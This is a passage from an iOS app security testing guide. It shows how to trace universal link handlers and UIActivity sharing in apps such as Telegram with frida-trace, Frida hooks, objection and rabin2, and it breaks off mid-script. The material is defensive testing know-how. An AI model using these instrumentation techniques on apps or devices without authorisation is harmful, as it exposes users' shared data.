If we long press on the first one
(\texttt{http://www.apple.com/shop/buy-iphone/iphone-xr}) it only offers
the option to open it (in the browser).

\begin{figure}
\centering
\includegraphics[width=2.60417in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/e630660530187b6fd1e8abc487b7f7ea1ac607f9.png}
\caption{Images/Chapters/0x06h/forbidden\_universal\_link.png}
\end{figure}

If we long press on the second (\texttt{http://www.apple.com/today}) it
shows options to open it in Safari and in ``Apple Store'':

\begin{figure}
\centering
\includegraphics[width=2.60417in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/78ccba3d3728d1b436149123dac95a31099b24de.png}
\caption{Images/Chapters/0x06h/allowed\_universal\_link.png}
\end{figure}

\begin{quote}
Note that there is a difference between a click and a long press. Once
we long press a link and select an option, e.g.~``Open in Safari'', this
will become the default option for all future clicks until we long press
again and select another option.
\end{quote}

If we repeat the process and hook or trace the
\texttt{application:continueUserActivity:restorationHandler:} method we
will see how it gets called as soon as we open the allowed universal
link. For this you can use frida-trace for example:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ frida}\OperatorTok{{-}}\NormalTok{trace }\OperatorTok{{-}}\NormalTok{U }\StringTok{"Apple Store"} \OperatorTok{{-}}\NormalTok{m }\StringTok{"*[* *restorationHandler*]"}
\end{Highlighting}
\end{Shaded}

Tracing the Link Receiver Method

This section explains how to trace the link receiver method and how to
extract additional information. For this example, we will use Telegram,
as there are no restrictions in its \texttt{apple-app-site-association}
file:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{\{}
    \DataTypeTok{"applinks"}\FunctionTok{:} \FunctionTok{\{}
        \DataTypeTok{"apps"}\FunctionTok{:} \OtherTok{[]}\FunctionTok{,}
        \DataTypeTok{"details"}\FunctionTok{:} \OtherTok{[}
            \FunctionTok{\{}
                \DataTypeTok{"appID"}\FunctionTok{:} \StringTok{"X834Q8SBVP.org.telegram.TelegramEnterprise"}\FunctionTok{,}
                \DataTypeTok{"paths"}\FunctionTok{:} \OtherTok{[}
                    \StringTok{"*"}
                \OtherTok{]}
            \FunctionTok{\}}\OtherTok{,}
            \FunctionTok{\{}
                \DataTypeTok{"appID"}\FunctionTok{:} \StringTok{"C67CF9S4VU.ph.telegra.Telegraph"}\FunctionTok{,}
                \DataTypeTok{"paths"}\FunctionTok{:} \OtherTok{[}
                    \StringTok{"*"}
                \OtherTok{]}
            \FunctionTok{\}}\OtherTok{,}
            \FunctionTok{\{}
                \DataTypeTok{"appID"}\FunctionTok{:} \StringTok{"X834Q8SBVP.org.telegram.Telegram{-}iOS"}\FunctionTok{,}
                \DataTypeTok{"paths"}\FunctionTok{:} \OtherTok{[}
                    \StringTok{"*"}
                \OtherTok{]}
            \FunctionTok{\}}
        \OtherTok{]}
    \FunctionTok{\}}
\FunctionTok{\}}
\end{Highlighting}
\end{Shaded}

In order to open the links we will also use the Notes app and
frida-trace with the following pattern:

\begin{verbatim}
$ frida-trace -U Telegram -m "*[* *restorationHandler*]"
\end{verbatim}

Write \texttt{https://t.me/addstickers/radare} (found through a quick
Internet research) and open it from the Notes app.

\begin{figure}
\centering
\includegraphics[width=2.60417in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/c541fc7b7d3f4dd9ff4b816d9bc3e5ce0484f553.png}
\caption{Images/Chapters/0x06h/telegram\_add\_stickers\_universal\_link.png}
\end{figure}

First we let frida-trace generate the stubs in
\texttt{\_\_handlers\_\_/}:

\begin{verbatim}
$ frida-trace -U Telegram -m "*[* *restorationHandler*]"
Instrumenting functions...
-[AppDelegate application:continueUserActivity:restorationHandler:]
\end{verbatim}

You can see that only one function was found and is being instrumented.
Trigger now the universal link and observe the traces.

\begin{verbatim}
298382 ms  -[AppDelegate application:0x10556b3c0 continueUserActivity:0x1c4237780
                restorationHandler:0x16f27a898]
\end{verbatim}

You can observe that the function is in fact being called. You can now
add code to the stubs in \texttt{\_\_handlers\_\_/} to obtain more
details:

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{// \_\_handlers\_\_/\_\_AppDelegate\_application\_contin\_8e36bbb1.js}

\NormalTok{  onEnter}\OperatorTok{:} \KeywordTok{function}\NormalTok{ (log}\OperatorTok{,}\NormalTok{ args}\OperatorTok{,}\NormalTok{ state) }\OperatorTok{\{}
    \AttributeTok{log}\NormalTok{(}\StringTok{"{-}[AppDelegate application: "} \OperatorTok{+}\NormalTok{ args[}\DecValTok{2}\NormalTok{] }\OperatorTok{+} \StringTok{" continueUserActivity: "} \OperatorTok{+}\NormalTok{ args[}\DecValTok{3}\NormalTok{] }\OperatorTok{+}
                     \StringTok{" restorationHandler: "} \OperatorTok{+}\NormalTok{ args[}\DecValTok{4}\NormalTok{] }\OperatorTok{+} \StringTok{"]"}\NormalTok{)}\OperatorTok{;}
    \AttributeTok{log}\NormalTok{(}\StringTok{"}\SpecialCharTok{\textbackslash{}t}\StringTok{application: "} \OperatorTok{+} \VariableTok{ObjC}\NormalTok{.}\AttributeTok{Object}\NormalTok{(args[}\DecValTok{2}\NormalTok{]).}\AttributeTok{toString}\NormalTok{())}\OperatorTok{;}
    \AttributeTok{log}\NormalTok{(}\StringTok{"}\SpecialCharTok{\textbackslash{}t}\StringTok{continueUserActivity: "} \OperatorTok{+} \VariableTok{ObjC}\NormalTok{.}\AttributeTok{Object}\NormalTok{(args[}\DecValTok{3}\NormalTok{]).}\AttributeTok{toString}\NormalTok{())}\OperatorTok{;}
    \AttributeTok{log}\NormalTok{(}\StringTok{"}\SpecialCharTok{\textbackslash{}t\textbackslash{}t}\StringTok{webpageURL: "} \OperatorTok{+} \VariableTok{ObjC}\NormalTok{.}\AttributeTok{Object}\NormalTok{(args[}\DecValTok{3}\NormalTok{]).}\AttributeTok{webpageURL}\NormalTok{().}\AttributeTok{toString}\NormalTok{())}\OperatorTok{;}
    \AttributeTok{log}\NormalTok{(}\StringTok{"}\SpecialCharTok{\textbackslash{}t\textbackslash{}t}\StringTok{activityType: "} \OperatorTok{+} \VariableTok{ObjC}\NormalTok{.}\AttributeTok{Object}\NormalTok{(args[}\DecValTok{3}\NormalTok{]).}\AttributeTok{activityType}\NormalTok{().}\AttributeTok{toString}\NormalTok{())}\OperatorTok{;}
    \AttributeTok{log}\NormalTok{(}\StringTok{"}\SpecialCharTok{\textbackslash{}t\textbackslash{}t}\StringTok{userInfo: "} \OperatorTok{+} \VariableTok{ObjC}\NormalTok{.}\AttributeTok{Object}\NormalTok{(args[}\DecValTok{3}\NormalTok{]).}\AttributeTok{userInfo}\NormalTok{().}\AttributeTok{toString}\NormalTok{())}\OperatorTok{;}
    \AttributeTok{log}\NormalTok{(}\StringTok{"}\SpecialCharTok{\textbackslash{}t}\StringTok{restorationHandler: "} \OperatorTok{+}\VariableTok{ObjC}\NormalTok{.}\AttributeTok{Object}\NormalTok{(args[}\DecValTok{4}\NormalTok{]).}\AttributeTok{toString}\NormalTok{())}\OperatorTok{;}
  \OperatorTok{\},}
\end{Highlighting}
\end{Shaded}

The new output is:

\begin{verbatim}
298382 ms  -[AppDelegate application:0x10556b3c0 continueUserActivity:0x1c4237780
                restorationHandler:0x16f27a898]
298382 ms  application:<Application: 0x10556b3c0>
298382 ms  continueUserActivity:<NSUserActivity: 0x1c4237780>
298382 ms       webpageURL:http://t.me/addstickers/radare
298382 ms       activityType:NSUserActivityTypeBrowsingWeb
298382 ms       userInfo:{
}
298382 ms  restorationHandler:<__NSStackBlock__: 0x16f27a898>
\end{verbatim}

Apart from the function parameters we have added more information by
calling some methods from them to get more details, in this case about
the \texttt{NSUserActivity}. If we look in the
\href{https://developer.apple.com/documentation/foundation/nsuseractivity?language=objc}{Apple
Developer Documentation} we can see what else we can call from this
object.

Checking How the Links Are Opened

If you want to know more about which function actually opens the URL and
how the data is actually being handled you should keep investigating.

Extend the previous command in order to find out if there are any other
functions involved into opening the URL.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\ExtensionTok{frida{-}trace}\NormalTok{ {-}U Telegram {-}m }\StringTok{"*[* *restorationHandler*]"}\NormalTok{ {-}i }\StringTok{"*open*Url*"}
\end{Highlighting}
\end{Shaded}

\begin{quote}
\texttt{-i} includes any method. You can also use a glob pattern here
(e.g.~\texttt{-i\ "*open*Url*"} means ``include any function containing
`open', then `Url' and something else'')
\end{quote}

Again, we first let frida-trace generate the stubs in
\texttt{\_\_handlers\_\_/}:

\begin{verbatim}
$ frida-trace -U Telegram -m "*[* *restorationHandler*]" -i "*open*Url*"
Instrumenting functions...
-[AppDelegate application:continueUserActivity:restorationHandler:]
$S10TelegramUI0A19ApplicationBindingsC16openUniversalUrlyySS_AA0ac4OpenG10Completion...
$S10TelegramUI15openExternalUrl7account7context3url05forceD016presentationData18application...
$S10TelegramUI31AuthorizationSequenceControllerC7account7strings7openUrl5apiId0J4HashAC0A4Core19...
...
\end{verbatim}

Now you can see a long list of functions but we still don't know which
ones will be called. Trigger the universal link again and observe the
traces.

\begin{verbatim}
           /* TID 0x303 */
298382 ms  -[AppDelegate application:0x10556b3c0 continueUserActivity:0x1c4237780
                restorationHandler:0x16f27a898]
298619 ms     | $S10TelegramUI15openExternalUrl7account7context3url05forceD016presentationData
                18applicationContext20navigationController12dismissInputy0A4Core7AccountC_AA
                14OpenURLContextOSSSbAA012PresentationK0CAA0a11ApplicationM0C7Display0
                10NavigationO0CSgyyctF()
\end{verbatim}

Apart from the Objective-C method, now there is one Swift function that
is also of your interest.

There is probably no documentation for that Swift function but you can
just demangle its symbol using \texttt{swift-demangle} via
\href{http://www.manpagez.com/man/1/xcrun/}{\texttt{xcrun}}:

\begin{quote}
xcrun can be used invoke Xcode developer tools from the command-line,
without having them in the path. In this case it will locate and run
swift-demangle, an Xcode tool that demangles Swift symbols.
\end{quote}

\begin{verbatim}
$ xcrun swift-demangle S10TelegramUI15openExternalUrl7account7context3url05forceD016presentationData
18applicationContext20navigationController12dismissInputy0A4Core7AccountC_AA14OpenURLContextOSSSbAA0
12PresentationK0CAA0a11ApplicationM0C7Display010NavigationO0CSgyyctF
\end{verbatim}

Resulting in:

\begin{verbatim}
---> TelegramUI.openExternalUrl(
    account: TelegramCore.Account, context: TelegramUI.OpenURLContext, url: Swift.String,
    forceExternal: Swift.Bool, presentationData: TelegramUI.PresentationData,
    applicationContext: TelegramUI.TelegramApplicationContext,
    navigationController: Display.NavigationController?, dismissInput: () -> ()) -> ()
\end{verbatim}

This not only gives you the class (or module) of the method, its name
and the parameters but also reveals the parameter types and return type,
so in case you need to dive deeper now you know where to start.

For now we will use this information to properly print the parameters by
editing the stub file:

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{// \_\_handlers\_\_/TelegramUI/\_S10TelegramUI15openExternalUrl7\_b1a3234e.js}

\NormalTok{  onEnter}\OperatorTok{:} \KeywordTok{function}\NormalTok{ (log}\OperatorTok{,}\NormalTok{ args}\OperatorTok{,}\NormalTok{ state) }\OperatorTok{\{}

    \AttributeTok{log}\NormalTok{(}\StringTok{"TelegramUI.openExternalUrl(account: TelegramCore.Account,}
        \DataTypeTok{context}\OperatorTok{:} \VariableTok{TelegramUI}\NormalTok{.}\AttributeTok{OpenURLContext}\OperatorTok{,} \DataTypeTok{url}\OperatorTok{:} \VariableTok{Swift}\NormalTok{.}\AttributeTok{String}\OperatorTok{,} \DataTypeTok{forceExternal}\OperatorTok{:} \VariableTok{Swift}\NormalTok{.}\AttributeTok{Bool}\OperatorTok{,}
        \DataTypeTok{presentationData}\OperatorTok{:} \VariableTok{TelegramUI}\NormalTok{.}\AttributeTok{PresentationData}\OperatorTok{,}
        \DataTypeTok{applicationContext}\OperatorTok{:} \VariableTok{TelegramUI}\NormalTok{.}\AttributeTok{TelegramApplicationContext}\OperatorTok{,}
        \DataTypeTok{navigationController}\OperatorTok{:} \VariableTok{Display}\NormalTok{.}\AttributeTok{NavigationController}\OperatorTok{?,}\NormalTok{ dismissInput: () }\OperatorTok{{-}>}\NormalTok{ ()) }\OperatorTok{{-}>}\NormalTok{ ()}\StringTok{");}
    \AttributeTok{log}\NormalTok{(}\StringTok{"}\SpecialCharTok{\textbackslash{}t}\StringTok{account: "} \OperatorTok{+} \VariableTok{ObjC}\NormalTok{.}\AttributeTok{Object}\NormalTok{(args[}\DecValTok{0}\NormalTok{]).}\AttributeTok{toString}\NormalTok{())}\OperatorTok{;}
    \AttributeTok{log}\NormalTok{(}\StringTok{"}\SpecialCharTok{\textbackslash{}t}\StringTok{context: "} \OperatorTok{+} \VariableTok{ObjC}\NormalTok{.}\AttributeTok{Object}\NormalTok{(args[}\DecValTok{1}\NormalTok{]).}\AttributeTok{toString}\NormalTok{())}\OperatorTok{;}
    \AttributeTok{log}\NormalTok{(}\StringTok{"}\SpecialCharTok{\textbackslash{}t}\StringTok{url: "} \OperatorTok{+} \VariableTok{ObjC}\NormalTok{.}\AttributeTok{Object}\NormalTok{(args[}\DecValTok{2}\NormalTok{]).}\AttributeTok{toString}\NormalTok{())}\OperatorTok{;}
    \AttributeTok{log}\NormalTok{(}\StringTok{"}\SpecialCharTok{\textbackslash{}t}\StringTok{presentationData: "} \OperatorTok{+}\NormalTok{ args[}\DecValTok{3}\NormalTok{])}\OperatorTok{;}
    \AttributeTok{log}\NormalTok{(}\StringTok{"}\SpecialCharTok{\textbackslash{}t}\StringTok{applicationContext: "} \OperatorTok{+} \VariableTok{ObjC}\NormalTok{.}\AttributeTok{Object}\NormalTok{(args[}\DecValTok{4}\NormalTok{]).}\AttributeTok{toString}\NormalTok{())}\OperatorTok{;}
    \AttributeTok{log}\NormalTok{(}\StringTok{"}\SpecialCharTok{\textbackslash{}t}\StringTok{navigationController: "} \OperatorTok{+} \VariableTok{ObjC}\NormalTok{.}\AttributeTok{Object}\NormalTok{(args[}\DecValTok{5}\NormalTok{]).}\AttributeTok{toString}\NormalTok{())}\OperatorTok{;}
  \OperatorTok{\},}
\end{Highlighting}
\end{Shaded}

This way, the next time we run it we get a much more detailed output:

\begin{verbatim}
298382 ms  -[AppDelegate application:0x10556b3c0 continueUserActivity:0x1c4237780
                restorationHandler:0x16f27a898]
298382 ms  application:<Application: 0x10556b3c0>
298382 ms  continueUserActivity:<NSUserActivity: 0x1c4237780>
298382 ms       webpageURL:http://t.me/addstickers/radare
298382 ms       activityType:NSUserActivityTypeBrowsingWeb
298382 ms       userInfo:{
}
298382 ms  restorationHandler:<__NSStackBlock__: 0x16f27a898>

298619 ms     | TelegramUI.openExternalUrl(account: TelegramCore.Account,
context: TelegramUI.OpenURLContext, url: Swift.String, forceExternal: Swift.Bool,
presentationData: TelegramUI.PresentationData, applicationContext:
TelegramUI.TelegramApplicationContext, navigationController: Display.NavigationController?,
dismissInput: () -> ()) -> ()
298619 ms     |     account: TelegramCore.Account
298619 ms     |     context: nil
298619 ms     |     url: http://t.me/addstickers/radare
298619 ms     |     presentationData: 0x1c4e40fd1
298619 ms     |     applicationContext: nil
298619 ms     |     navigationController: TelegramUI.PresentationData
\end{verbatim}

There you can observe the following:

\begin{itemize}
\tightlist
\item
  It calls \texttt{application:continueUserActivity:restorationHandler:}
  from the app delegate as expected.
\item
  \texttt{application:continueUserActivity:restorationHandler:} handles
  the URL but does not open it, it calls
  \texttt{TelegramUI.openExternalUrl} for that.
\item
  The URL being opened is \texttt{https://t.me/addstickers/radare}.
\end{itemize}

You can now keep going and try to trace and verify how the data is being
validated. For example, if you have two apps that \emph{communicate} via
universal links you can use this to see if the sending app is leaking
sensitive data by hooking these methods in the receiving app. This is
especially useful when you don't have the source code as you will be
able to retrieve the full URL that you wouldn't see other way as it
might be the result of clicking some button or triggering some
functionality.

In some cases, you might find data in \texttt{userInfo} of the
\texttt{NSUserActivity} object. In the previous case there was no data
being transferred but it might be the case for other scenarios. To see
this, be sure to hook the \texttt{userInfo} property or access it
directly from the \texttt{continueUserActivity} object in your hook
(e.g.~by adding a line like this
\texttt{log("userInfo:"\ +\ ObjC.Object(args{[}3{]}).userInfo().toString());}).

Final Notes about Universal Links and Handoff

Universal links and Apple's
\href{https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/Handoff/HandoffFundamentals/HandoffFundamentals.html\#//apple_ref/doc/uid/TP40014338}{Handoff
feature} are related:

\begin{itemize}
\tightlist
\item
  Both rely on the same method when receiving data
  (\texttt{application:continueUserActivity:restorationHandler:}).
\item
  Like universal links, the Handoff's Activity Continuation must be
  declared in the \texttt{com.apple.developer.associated-domains}
  entitlement and in the server's \texttt{apple-app-site-association}
  file (in both cases via the keyword \texttt{"activitycontinuation":}).
  See ``Retrieving the Apple App Site Association File'' above for an
  example.
\end{itemize}

Actually, the previous example in ``Checking How the Links Are Opened''
is very similar to the ``Web Browser--to--Native App Handoff'' scenario
described in the
\href{https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/Handoff/AdoptingHandoff/AdoptingHandoff.html\#//apple_ref/doc/uid/TP40014338-CH2-SW10}{``Handoff
Programming Guide''}:

\begin{quote}
If the user is using a web browser on the originating device, and the
receiving device is an iOS device with a native app that claims the
domain portion of the \texttt{webpageURL} property, then iOS launches
the native app and sends it an \texttt{NSUserActivity} object with an
\texttt{activityType} value of \texttt{NSUserActivityTypeBrowsingWeb}.
The \texttt{webpageURL} property contains the URL the user was visiting,
while the \texttt{userInfo} dictionary is empty.
\end{quote}

In the detailed output above you can see that \texttt{NSUserActivity}
object we've received meets exactly the mentioned points:

\begin{verbatim}
298382 ms  -[AppDelegate application:0x10556b3c0 continueUserActivity:0x1c4237780
                restorationHandler:0x16f27a898]
298382 ms  application:<Application: 0x10556b3c0>
298382 ms  continueUserActivity:<NSUserActivity: 0x1c4237780>
298382 ms       webpageURL:http://t.me/addstickers/radare
298382 ms       activityType:NSUserActivityTypeBrowsingWeb
298382 ms       userInfo:{
}
298382 ms  restorationHandler:<__NSStackBlock__: 0x16f27a898>
\end{verbatim}

This knowledge should help you when testing apps supporting Handoff.

\hypertarget{uiactivity-sharing}{%
\paragraph{UIActivity Sharing}\label{uiactivity-sharing}}

\hypertarget{overview-61}{%
\subparagraph{Overview}\label{overview-61}}

Starting on iOS 6 it is possible for third-party apps to share data
(items) via specific mechanisms
\href{https://developer.apple.com/library/archive/documentation/iPhone/Conceptual/iPhoneOSProgrammingGuide/Inter-AppCommunication/Inter-AppCommunication.html\#//apple_ref/doc/uid/TP40007072-CH6-SW3}{like
AirDrop, for example}. From a user perspective, this feature is the
well-known system-wide \emph{share activity sheet} that appears after
clicking on the ``Share'' button.

\begin{figure}
\centering
\includegraphics[width=5.72917in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/8f48bb85a349f9e3264a10f6d5ab82d6404eb8b7.png}
\caption{Images/Chapters/0x06h/share\_activity\_sheet.png}
\end{figure}

The available built-in sharing mechanisms (aka. Activity Types) include:

\begin{itemize}
\tightlist
\item
  airDrop
\item
  assignToContact
\item
  copyToPasteboard
\item
  mail
\item
  message
\item
  postToFacebook
\item
  postToTwitter
\end{itemize}

A full list can be found in
\href{https://developer.apple.com/documentation/uikit/uiactivity/activitytype}{UIActivity.ActivityType}.
If not considered appropriate for the app, the developers have the
possibility to exclude some of these sharing mechanisms.

\hypertarget{static-analysis-68}{%
\subparagraph{Static Analysis}\label{static-analysis-68}}

Sending Items

When testing \texttt{UIActivity} Sharing you should pay special
attention to:

\begin{itemize}
\tightlist
\item
  the data (items) being shared,
\item
  the custom activities,
\item
  the excluded activity types.
\end{itemize}

Data sharing via \texttt{UIActivity} works by creating a
\texttt{UIActivityViewController} and passing it the desired items
(URLs, text, a picture) on
\href{https://developer.apple.com/documentation/uikit/uiactivityviewcontroller/1622019-init}{\texttt{init(activityItems:applicationActivities:)}}.

As we mentioned before, it is possible to exclude some of the sharing
mechanisms via the controller's
\href{https://developer.apple.com/documentation/uikit/uiactivityviewcontroller/1622009-excludedactivitytypes}{\texttt{excludedActivityTypes}
property}. It is highly recommended to do the tests using the latest
versions of iOS as the number of activity types that can be excluded can
increase. The developers have to be aware of this and
\textbf{explicitely exclude} the ones that are not appropriate for the
app data. Some activity types might not be even documented like ``Create
Watch Face''.

If having the source code, you should take a look at the
\texttt{UIActivityViewController}:

\begin{itemize}
\tightlist
\item
  Inspect the activities passed to the
  \texttt{init(activityItems:applicationActivities:)} method.
\item
  Check if it defines custom activities (also being passed to the
  previous method).
\item
  Verify the \texttt{excludedActivityTypes}, if any.
\end{itemize}

If you only have the compiled/installed app, try searching for the
previous method and property, for example:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\ExtensionTok{rabin2}\NormalTok{ {-}zq Telegram\textbackslash{} X.app/Telegram\textbackslash{} X }\KeywordTok{|} \FunctionTok{grep}\NormalTok{ {-}i activityItems}
\ExtensionTok{0x1000df034}\NormalTok{ 45 44 initWithActivityItems:applicationActivities:}
\end{Highlighting}
\end{Shaded}

Receiving Items

When receiving items, you should check:

\begin{itemize}
\tightlist
\item
  if the app declares \emph{custom document types} by looking into
  Exported/Imported UTIs (``Info'' tab of the Xcode project). The list
  of all system declared UTIs (Uniform Type Identifiers) can be found in
  the
  \href{https://developer.apple.com/library/archive/documentation/Miscellaneous/Reference/UTIRef/Articles/System-DeclaredUniformTypeIdentifiers.html\#//apple_ref/doc/uid/TP40009259}{archived
  Apple Developer Documentation}.
\item
  if the app specifies any \emph{document types that it can open} by
  looking into Document Types (``Info'' tab of the Xcode project). If
  present, they consist of name and one or more UTIs that represent the
  data type (e.g.~``public.png'' for PNG files). iOS uses this to
  determine if the app is eligible to open a given document (specifying
  Exported/Imported UTIs is not enough).
\item
  if the app properly \emph{verifies the received data} by looking into
  the implementation of
  \href{https://developer.apple.com/documentation/uikit/uiapplicationdelegate/1623112-application?language=objc}{\texttt{application:openURL:options:}}
  (or its deprecated version
  \href{https://developer.apple.com/documentation/uikit/uiapplicationdelegate/1623073-application?language=objc}{\texttt{application:openURL:sourceApplication:annotation:}})
  in the app delegate.
\end{itemize}

If not having the source code you can still take a look into the
\texttt{Info.plist} file and search for:

\begin{itemize}
\tightlist
\item
  \texttt{UTExportedTypeDeclarations}/\texttt{UTImportedTypeDeclarations}
  if the app declares exported/imported \emph{custom document types}.
\item
  \texttt{CFBundleDocumentTypes} to see if the app specifies any
  \emph{document types that it can open}.
\end{itemize}

A very complete explanation about the use of these keys can be found
\href{https://stackoverflow.com/questions/21937978/what-are-utimportedtypedeclarations-and-utexportedtypedeclarations-used-for-on-i}{on
Stackoverflow}.

Let's see a real-world example. We will take a File Manager app and take
a look at these keys. We used
\href{https://github.com/sensepost/objection}{objection} here to read
the \texttt{Info.plist} file.

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{objection}\NormalTok{ {-}{-}gadget SomeFileManager run ios plist cat Info.plist}
\end{Highlighting}
\end{Shaded}

\begin{quote}
Note that this is the same as if we would retrieve the IPA from the
phone or accessed via e.g.~SSH and navigated to the corresponding folder
in the IPA / app sandbox. However, with objection we are just \emph{one
command away} from our goal and this can be still considered static
analysis.
\end{quote}

The first thing we noticed is that app does not declare any imported
custom document types but we could find a couple of exported ones:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{UTExportedTypeDeclarations =     (}
\NormalTok{            \{}
\NormalTok{        UTTypeConformsTo =             (}
\NormalTok{            "public.data"}
\NormalTok{        );}
\NormalTok{        UTTypeDescription = "SomeFileManager Files";}
\NormalTok{        UTTypeIdentifier = "com.some.filemanager.custom";}
\NormalTok{        UTTypeTagSpecification =             \{}
\NormalTok{            "public.filename{-}extension" =                 (}
\NormalTok{                ipa,}
\NormalTok{                deb,}
\NormalTok{                zip,}
\NormalTok{                rar,}
\NormalTok{                tar,}
\NormalTok{                gz,}
\NormalTok{                ...}
\NormalTok{                key,}
\NormalTok{                pem,}
\NormalTok{                p12,}
\NormalTok{                cer}
\NormalTok{            );}
\NormalTok{        \};}
\NormalTok{    \}}
\NormalTok{);}
\end{Highlighting}
\end{Shaded}

The app also declares the document types it opens as we can find the key
\texttt{CFBundleDocumentTypes}:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{CFBundleDocumentTypes =     (}
\NormalTok{        \{}
\NormalTok{        ...}
\NormalTok{        CFBundleTypeName = "SomeFileManager Files";}
\NormalTok{        LSItemContentTypes =             (}
\NormalTok{            "public.content",}
\NormalTok{            "public.data",}
\NormalTok{            "public.archive",}
\NormalTok{            "public.item",}
\NormalTok{            "public.database",}
\NormalTok{            "public.calendar{-}event",}
\NormalTok{            ...}
\NormalTok{        );}
\NormalTok{    \}}
\NormalTok{);}
\end{Highlighting}
\end{Shaded}

We can see that this File Manager will try to open anything that
conforms to any of the UTIs listed in \texttt{LSItemContentTypes} and
it's ready to open files with the extensions listed in
\texttt{UTTypeTagSpecification/"public.filename-extension"}. Please take
a note of this because it will be useful if you want to search for
vulnerabilities when dealing with the different types of files when
performing dynamic analysis.

\hypertarget{dynamic-analysis-64}{%
\subparagraph{Dynamic Analysis}\label{dynamic-analysis-64}}

Sending Items

There are three main things you can easily inspect by performing dynamic
instrumentation:

\begin{itemize}
\tightlist
\item
  The \texttt{activityItems}: an array of the items being shared. They
  might be of different types, e.g.~one string and one picture to be
  shared via a messaging app.
\item
  The \texttt{applicationActivities}: an array of \texttt{UIActivity}
  objects representing the app's custom services.
\item
  The \texttt{excludedActivityTypes}: an array of the Activity Types
  that are not supported, e.g.~\texttt{postToFacebook}.
\end{itemize}

To achieve this you can do two things:

\begin{itemize}
\tightlist
\item
  Hook the method we have seen in the static analysis
  (\href{https://developer.apple.com/documentation/uikit/uiactivityviewcontroller/1622019-init}{\texttt{init(activityItems:applicationActivities:)}})
  to get the \texttt{activityItems} and \texttt{applicationActivities}.
\item
  Find out the excluded activities by hooking
  \href{https://developer.apple.com/documentation/uikit/uiactivityviewcontroller/1622009-excludedactivitytypes}{\texttt{excludedActivityTypes}
  property}.
\end{itemize}

Let's see an example using Telegram to share a picture and a text file.
First prepare the hooks, we will use the Frida REPL and write a script
for this:

\begin{Shaded}
\begin{Highlighting}[]
\VariableTok{Interceptor}\NormalTok{.}\AttributeTok{attach}\NormalTok{(}
\VariableTok{ObjC}\NormalTok{.}\VariableTok{classes}\NormalTok{.}
\NormalTok{    UIActivityViewController[}\StringTok{\textquotesingle{}{-} initWithActivityItems:applicationActivities:\textquotesingle{}}\NormalTok{].}\AttributeTok{implementation}\OperatorTok{,} \OperatorTok{\{}
  \DataTypeTok{onEnter}\OperatorTok{:} \KeywordTok{function}\NormalTok{ (args) }\OperatorTok{\{}

    \AttributeTok{printHeader}\NormalTok{(args)}

    \KeywordTok{this}\NormalTok{.}\AttributeTok{initWithActivityItems} \OperatorTok{=} \VariableTok{ObjC}\NormalTok{.}\AttributeTok{Object}\NormalTok{(args[}\DecValTok{2}\NormalTok{])}\OperatorTok{;}
    \KeywordTok{this}\NormalTok{.}\AttributeTok{applicationActivities} \OperatorTok{=} \VariableTok{ObjC}\NormalTok{.}\AttributeTok{Object}\NormalTok{(args[}\DecValTok{3}\NormalTok{])}\OperatorTok{;}

    \VariableTok{console}\NormalTok{.}\AttributeTok{log}\NormalTok{(}\StringTok{"initWithActivityItems: "} \OperatorTok{+} \KeywordTok{this}\NormalTok{.}\AttributeTok{initWithActivityItems}\NormalTok{)}\OperatorTok{;}
    \VariableTok{console}\NormalTok{.}\AttributeTok{log}\NormalTok{(}\StringTok{"applicationActivities: "} \OperatorTok{+} \KeywordTok{this}\NormalTok{.}\AttributeTok{applicationActivities}\NormalTok{)}\OperatorTok{;}

  \OperatorTok{\},}
  \DataTypeTok{onLeave}\OperatorTok{:} \KeywordTok{function}\NormalTok{ (retval) }\OperatorTok{\{}
    \AttributeTok{printRet}\NormalTok{(retval)}\OperatorTok{;}
  \OperatorTok{\}}
\OperatorTok{\}}\NormalTok{)}\OperatorTok{;}

\VariableTok{Interceptor}\NormalTok{.}\AttributeTok{attach}\NormalTok{(}
\VariableTok{ObjC}\NormalTok{.}\VariableTok{classes}\NormalTok{.}\AttributeTok{UIActivityViewController}\NormalTok{[}\StringTok{\textquotesingle{}{-} excludedActivityTypes\textquotesingle{}}\NormalTok{].}\AttributeTok{implementation}\OperatorTok{,} \OperatorTok{\{}
  \DataTypeTok{onEnter}\OperatorTok{:} \KeywordTok{function}\NormalTok{ (args) }\OperatorTok{\{}
    \AttributeTok{printHeader}\NormalTok{(args)}
  \OperatorTok{\},}
  \DataTypeTok{onLeave}\OperatorTok{:} \KeywordTok{function}\NormalTok{ (retval) }\OperatorTok{\{}
    \AttributeTok{printRet}\NormalTok{(retval)}\OperatorTok{;}
  \OperatorTok{\}}
\OperatorTok{\}}\NormalTok{)}\OperatorTok{;}

\KeywordTok{function} \AttributeTok{printHeader}\NormalTok{(args) }\OperatorTok{\{}
  \VariableTok{console}\NormalTok{.}\AttributeTok{log}\NormalTok{(}\VariableTok{Memory}\NormalTok{.}\AttributeTok{readUtf8String}\NormalTok{(args[}\DecValTok{1}\NormalTok{]) }\OperatorTok{+} \StringTok{" @ "} \OperatorTok{+}\NormalTok{ args[}\DecValTok{1}\NormalTok{])}
\OperatorTok{\};}

\KeywordTok{function} \AttributeTok{printRet}\NormalTok{(retval) }\OperatorTok{\{}
  \VariableTok{console}\NormalTok{.}\AttributeTok{log}\NormalTok{(}\StringTok{\textquotesingle{}RET @ \textquotesingle{}} \OperatorTok{+}\NormalTok{ retval }\OperatorTok{+} \StringTok{\textquotesingle{}: \textquotesingle{}}\NormalTok{ )}\OperatorTok{;}
  \ControlFlowTok{try} \OperatorTok{\{}
    \VariableTok{console}\NormalTok{.}\AttributeTok{log}\NormalTok{(}\KeywordTok{new} \VariableTok{ObjC}\NormalTok{.}\AttributeTok{Object}\NormalTok{(retval).}\AttributeTok{toString}\NormalTok{())}\OperatorTok{;}
